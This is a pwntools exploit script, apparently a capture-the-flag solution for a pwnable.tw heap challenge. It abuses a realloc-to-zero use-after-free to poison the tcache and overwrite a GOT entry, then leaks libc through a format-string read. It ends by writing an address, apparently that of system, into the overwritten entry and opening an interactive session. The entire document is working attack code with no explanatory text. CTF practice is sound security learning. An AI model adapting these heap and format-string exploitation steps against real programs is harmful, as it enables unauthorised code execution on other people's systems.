from pwn import *

#io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})

io = remote("chall.pwnable.tw",10106)

def add(idx,size,data):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Index:",str(idx))
    io.sendlineafter("Size:",str(size))
    io.sendafter("Data:",str(data))

def re(idx,size,data=""):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Index:",str(idx))
    io.sendlineafter("Size:",str(size))
    if(size!=0):
        io.sendafter("Data:",str(data))

def free(idx):
    io.sendlineafter("Your choice: ","3")
    io.sendlineafter("Index:",str(idx))

add(0,50,"aaaa")
re(0,0)
re(0,50,"\x00"*15)
re(0,0)
re(0,50,"\x00"*15)
free(0)
add(1,50,p64(0x404048))
add(0,50,"aaaaa")
re(1,80,"aaaa")
free(1)
re(0,80,"\x00"*15)
free(0)
add(1,30,"bbb")
re(1,0)
re(1,30,"\x00"*15)
re(1,0)
re(1,30,"\x00"*15)
free(1)
add(1,30,p64(0x404048))
add(0,30,"aaaaa")
re(1,80,"aaaa")
free(1)
re(0,80,"\x00"*15)
free(0)
add(0,50,p64(0x0000000000401070))
io.sendlineafter("Your choice: ","2")
io.sendlineafter("Index:","%23$p")
leak = int(io.recvline().strip(),16)+0x2c465
log.info("libc @ "+str(hex(leak)))
io.sendlineafter("Your choice: ","1")
io.sendlineafter("Index:","")
io.sendlineafter("Size:","%29x")
io.sendafter("Data:",p64(leak))
#gdb.attach(io)
io.interactive()
